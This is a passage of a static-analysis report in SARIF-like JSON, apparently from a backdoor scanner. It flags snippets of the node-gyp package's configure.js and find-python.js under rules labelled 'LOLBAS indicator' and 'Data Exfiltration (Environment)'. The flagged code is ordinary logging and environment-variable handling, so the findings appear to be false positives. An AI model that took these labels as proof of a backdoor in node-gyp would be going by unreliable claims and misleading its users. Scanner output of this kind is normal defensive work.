                      "markdown": "`        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n      }\n\n      if (!release.semver) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 63,
                  "endLine": 64,
                  "endColumn": 69,
                  "snippet": {
                    "text": "      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n        // if --target was given, then determine a target version to compile for\n        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n",
                    "rendered": {
                      "text": "      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n        // if --target was given, then determine a target version to compile for\n        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n",
                      "markdown": "`      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n        // if --target was given, then determine a target version to compile for\n        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 24,
                  "endLine": 64,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n        // if --target was given, then determine a target version to compile for\n        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n",
                    "rendered": {
                      "text": "      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n        // if --target was given, then determine a target version to compile for\n        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n",
                      "markdown": "`      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n        // if --target was given, then determine a target version to compile for\n        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 22,
                  "endLine": 59,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    if (gyp.opts.nodedir) {\n      // --nodedir was specified. use that for the dev files\n      nodeDir = gyp.opts.nodedir.replace(/^~/, os.homedir())\n      log.verbose('get node dir', 'compiling against specified --nodedir dev files: %s', nodeDir)\n    } else {\n      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n",
                    "rendered": {
                      "text": "    if (gyp.opts.nodedir) {\n      // --nodedir was specified. use that for the dev files\n      nodeDir = gyp.opts.nodedir.replace(/^~/, os.homedir())\n      log.verbose('get node dir', 'compiling against specified --nodedir dev files: %s', nodeDir)\n    } else {\n      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n",
                      "markdown": "`    if (gyp.opts.nodedir) {\n      // --nodedir was specified. use that for the dev files\n      nodeDir = gyp.opts.nodedir.replace(/^~/, os.homedir())\n      log.verbose('get node dir', 'compiling against specified --nodedir dev files: %s', nodeDir)\n    } else {\n      // if no --nodedir specified, ensure node dependencies are installed\n      if ('v' + release.version !== process.version) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 32,
                  "endLine": 51,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      if (availVersion === release.version) {\n        // ok version matches, use the headers\n        gyp.opts.nodedir = prefix\n        log.verbose('using local node headers based on prefix',\n          'setting nodedir to ' + gyp.opts.nodedir)\n      }\n    }\n",
                    "rendered": {
                      "text": "      if (availVersion === release.version) {\n        // ok version matches, use the headers\n        gyp.opts.nodedir = prefix\n        log.verbose('using local node headers based on prefix',\n          'setting nodedir to ' + gyp.opts.nodedir)\n      }\n    }\n",
                      "markdown": "`      if (availVersion === release.version) {\n        // ok version matches, use the headers\n        gyp.opts.nodedir = prefix\n        log.verbose('using local node headers based on prefix',\n          'setting nodedir to ' + gyp.opts.nodedir)\n      }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 4,
                  "endLine": 311,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n    await new Promise((resolve, reject) => {\n      const cp = gyp.spawn(python, argv)\n",
                    "rendered": {
                      "text": "    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n    await new Promise((resolve, reject) => {\n      const cp = gyp.spawn(python, argv)\n",
                      "markdown": "`    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n    await new Promise((resolve, reject) => {\n      const cp = gyp.spawn(python, argv)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 309,
                  "startColumn": 18,
                  "endLine": 309,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    // make sure python uses files that came with this particular node package\n    const pypath = [path.join(__dirname, '..', 'gyp', 'pylib')]\n    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n",
                    "rendered": {
                      "text": "    // make sure python uses files that came with this particular node package\n    const pypath = [path.join(__dirname, '..', 'gyp', 'pylib')]\n    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n",
                      "markdown": "`    // make sure python uses files that came with this particular node package\n    const pypath = [path.join(__dirname, '..', 'gyp', 'pylib')]\n    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 308,
                  "startColumn": 8,
                  "endLine": 308,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n    // make sure python uses files that came with this particular node package\n    const pypath = [path.join(__dirname, '..', 'gyp', 'pylib')]\n    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n",
                    "rendered": {
                      "text": "\n    // make sure python uses files that came with this particular node package\n    const pypath = [path.join(__dirname, '..', 'gyp', 'pylib')]\n    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n",
                      "markdown": "`\n    // make sure python uses files that came with this particular node package\n    const pypath = [path.join(__dirname, '..', 'gyp', 'pylib')]\n    if (process.env.PYTHONPATH) {\n      pypath.push(process.env.PYTHONPATH)\n    }\n    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 75,
                  "endLine": 222,
                  "endColumn": 86,
                  "snippet": {
                    "text": "        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n      } else {\n        candidates = [\n",
                    "rendered": {
                      "text": "        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n      } else {\n        candidates = [\n",
                      "markdown": "`        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n      } else {\n        candidates = [\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 26,
                  "endLine": 216,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    if (process.platform === 'os390') {\n      logprefix = \"find zoslib's zos-base.h:\"\n      let msg\n      let zoslibIncPath = process.env.ZOSLIB_INCLUDES\n      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n",
                    "rendered": {
                      "text": "    if (process.platform === 'os390') {\n      logprefix = \"find zoslib's zos-base.h:\"\n      let msg\n      let zoslibIncPath = process.env.ZOSLIB_INCLUDES\n      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n",
                      "markdown": "`    if (process.platform === 'os390') {\n      logprefix = \"find zoslib's zos-base.h:\"\n      let msg\n      let zoslibIncPath = process.env.ZOSLIB_INCLUDES\n      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 6,
                  "endLine": 122,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  async function createConfigFile (vsInfo) {\n    if (win) {\n      process.env.GYP_MSVS_VERSION = Math.min(vsInfo.versionYear, 2015)\n      process.env.GYP_MSVS_OVERRIDE_PATH = vsInfo.path\n    }\n    const configPath = await createConfigGypi({ gyp, buildDir, nodeDir, vsInfo, python })\n    configs.push(configPath)\n",
                    "rendered": {
                      "text": "  async function createConfigFile (vsInfo) {\n    if (win) {\n      process.env.GYP_MSVS_VERSION = Math.min(vsInfo.versionYear, 2015)\n      process.env.GYP_MSVS_OVERRIDE_PATH = vsInfo.path\n    }\n    const configPath = await createConfigGypi({ gyp, buildDir, nodeDir, vsInfo, python })\n    configs.push(configPath)\n",
                      "markdown": "`  async function createConfigFile (vsInfo) {\n    if (win) {\n      process.env.GYP_MSVS_VERSION = Math.min(vsInfo.versionYear, 2015)\n      process.env.GYP_MSVS_OVERRIDE_PATH = vsInfo.path\n    }\n    const configPath = await createConfigGypi({ gyp, buildDir, nodeDir, vsInfo, python })\n    configs.push(configPath)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 6,
                  "endLine": 121,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n  async function createConfigFile (vsInfo) {\n    if (win) {\n      process.env.GYP_MSVS_VERSION = Math.min(vsInfo.versionYear, 2015)\n      process.env.GYP_MSVS_OVERRIDE_PATH = vsInfo.path\n    }\n    const configPath = await createConfigGypi({ gyp, buildDir, nodeDir, vsInfo, python })\n",
                    "rendered": {
                      "text": "\n  async function createConfigFile (vsInfo) {\n    if (win) {\n      process.env.GYP_MSVS_VERSION = Math.min(vsInfo.versionYear, 2015)\n      process.env.GYP_MSVS_OVERRIDE_PATH = vsInfo.path\n    }\n    const configPath = await createConfigGypi({ gyp, buildDir, nodeDir, vsInfo, python })\n",
                      "markdown": "`\n  async function createConfigFile (vsInfo) {\n    if (win) {\n      process.env.GYP_MSVS_VERSION = Math.min(vsInfo.versionYear, 2015)\n      process.env.GYP_MSVS_OVERRIDE_PATH = vsInfo.path\n    }\n    const configPath = await createConfigGypi({ gyp, buildDir, nodeDir, vsInfo, python })\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 4,
                  "endLine": 32,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n  async function getNodeDir () {\n    // 'python' should be set by now\n    process.env.PYTHON = python\n\n    if (!gyp.opts.nodedir &&\n        process.config.variables.use_prefix_to_find_headers) {\n",
                    "rendered": {
                      "text": "\n  async function getNodeDir () {\n    // 'python' should be set by now\n    process.env.PYTHON = python\n\n    if (!gyp.opts.nodedir &&\n        process.config.variables.use_prefix_to_find_headers) {\n",
                      "markdown": "`\n  async function getNodeDir () {\n    // 'python' should be set by now\n    process.env.PYTHON = python\n\n    if (!gyp.opts.nodedir &&\n        process.config.variables.use_prefix_to_find_headers) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 282,
                  "startColumn": 30,
                  "endLine": 282,
                  "endColumn": 76,
                  "snippet": {
                    "text": "    }\n    argv.push('-Dnode_gyp_dir=' + nodeGypDir)\n\n    // Do this to keep Cygwin environments happy, else the unescaped '\\' gets eaten up,\n    // resulting in bad paths, Ex c:parentFolderfolderanotherFolder instead of c:\\parentFolder\\folder\\anotherFolder\n    if (win) {\n      nodeLibFile = nodeLibFile.replace(/\\\\/g, '\\\\\\\\')\n",
                    "rendered": {
                      "text": "    }\n    argv.push('-Dnode_gyp_dir=' + nodeGypDir)\n\n    // Do this to keep Cygwin environments happy, else the unescaped '\\' gets eaten up,\n    // resulting in bad paths, Ex c:parentFolderfolderanotherFolder instead of c:\\parentFolder\\folder\\anotherFolder\n    if (win) {\n      nodeLibFile = nodeLibFile.replace(/\\\\/g, '\\\\\\\\')\n",
                      "markdown": "`    }\n    argv.push('-Dnode_gyp_dir=' + nodeGypDir)\n\n    // Do this to keep Cygwin environments happy, else the unescaped '\\' gets eaten up,\n    // resulting in bad paths, Ex c:parentFolderfolderanotherFolder instead of c:\\parentFolder\\folder\\anotherFolder\n    if (win) {\n      nodeLibFile = nodeLibFile.replace(/\\\\/g, '\\\\\\\\')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 27,
                  "endLine": 234,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        zoslibIncPath = findAccessibleSync(logprefix, nodeRootDir, candidates)\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find any of %s in directory %s; set ' +\n                          'environmant variable ZOSLIB_INCLUDES to the path ' +\n                          'that contains zos-base.h', candidates.toString(), nodeRootDir)\n        }\n      }\n",
                    "rendered": {
                      "text": "        zoslibIncPath = findAccessibleSync(logprefix, nodeRootDir, candidates)\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find any of %s in directory %s; set ' +\n                          'environmant variable ZOSLIB_INCLUDES to the path ' +\n                          'that contains zos-base.h', candidates.toString(), nodeRootDir)\n        }\n      }\n",
                      "markdown": "`        zoslibIncPath = findAccessibleSync(logprefix, nodeRootDir, candidates)\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find any of %s in directory %s; set ' +\n                          'environmant variable ZOSLIB_INCLUDES to the path ' +\n                          'that contains zos-base.h', candidates.toString(), nodeRootDir)\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 83,
                  "endLine": 222,
                  "endColumn": 97,
                  "snippet": {
                    "text": "        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n      } else {\n        candidates = [\n",
                    "rendered": {
                      "text": "        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n      } else {\n        candidates = [\n",
                      "markdown": "`        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n      } else {\n        candidates = [\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 34,
                  "endLine": 216,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    if (process.platform === 'os390') {\n      logprefix = \"find zoslib's zos-base.h:\"\n      let msg\n      let zoslibIncPath = process.env.ZOSLIB_INCLUDES\n      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n",
                    "rendered": {
                      "text": "    if (process.platform === 'os390') {\n      logprefix = \"find zoslib's zos-base.h:\"\n      let msg\n      let zoslibIncPath = process.env.ZOSLIB_INCLUDES\n      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n",
                      "markdown": "`    if (process.platform === 'os390') {\n      logprefix = \"find zoslib's zos-base.h:\"\n      let msg\n      let zoslibIncPath = process.env.ZOSLIB_INCLUDES\n      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 277,
                  "startColumn": 56,
                  "endLine": 277,
                  "endColumn": 60,
                  "snippet": {
                    "text": "  }\n\n  succeed (execPath, version) {\n    this.log.info(`using Python version ${version} found at \"${execPath}\"`)\n    return execPath\n  }\n\n",
                    "rendered": {
                      "text": "  }\n\n  succeed (execPath, version) {\n    this.log.info(`using Python version ${version} found at \"${execPath}\"`)\n    return execPath\n  }\n\n",
                      "markdown": "`  }\n\n  succeed (execPath, version) {\n    this.log.info(`using Python version ${version} found at \"${execPath}\"`)\n    return execPath\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 306,
                  "startColumn": 30,
                  "endLine": 306,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    ].join('\\n')\n\n    this.log.error(`\\n${errorLog}\\n\\n${info}\\n`)\n    throw new Error('Could not find any Python installation to use')\n  }\n}\n\n",
                    "rendered": {
                      "text": "    ].join('\\n')\n\n    this.log.error(`\\n${errorLog}\\n\\n${info}\\n`)\n    throw new Error('Could not find any Python installation to use')\n  }\n}\n\n",
                      "markdown": "`    ].join('\\n')\n\n    this.log.error(`\\n${errorLog}\\n\\n${info}\\n`)\n    throw new Error('Could not find any Python installation to use')\n  }\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 293,
                  "startColumn": 33,
                  "endLine": 293,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    const info = [\n      '**********************************************************',\n      'You need to install the latest version of Python.',\n      'Node-gyp should be able to find and use Python. If not,',\n      'you can try one of the following options:',\n      `- Use the switch --python=\"${pathExample}\"`,\n      '  (accepted by both node-gyp and npm)',\n",
                    "rendered": {
                      "text": "    const info = [\n      '**********************************************************',\n      'You need to install the latest version of Python.',\n      'Node-gyp should be able to find and use Python. If not,',\n      'you can try one of the following options:',\n      `- Use the switch --python=\"${pathExample}\"`,\n      '  (accepted by both node-gyp and npm)',\n",
                      "markdown": "`    const info = [\n      '**********************************************************',\n      'You need to install the latest version of Python.',\n      'Node-gyp should be able to find and use Python. If not,',\n      'you can try one of the following options:',\n      `- Use the switch --python=\"${pathExample}\"`,\n      '  (accepted by both node-gyp and npm)',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 9,
                  "endLine": 257,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n  // Run an executable or shell command, trimming the output.\n  async run (exec, args, shell) {\n    const env = Object.assign({}, this.env)\n    env.TERM = 'dumb'\n    const opts = { env, shell }\n\n",
                    "rendered": {
                      "text": "\n  // Run an executable or shell command, trimming the output.\n  async run (exec, args, shell) {\n    const env = Object.assign({}, this.env)\n    env.TERM = 'dumb'\n    const opts = { env, shell }\n\n",
                      "markdown": "`\n  // Run an executable or shell command, trimming the output.\n  async run (exec, args, shell) {\n    const env = Object.assign({}, this.env)\n    env.TERM = 'dumb'\n    const opts = { env, shell }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-python.js"
                },
                "region": {
                  "startLine": 196,
                  "startColumn": 33,
                  "endLine": 196,
                  "endColumn": 39,
                  "snippet": {
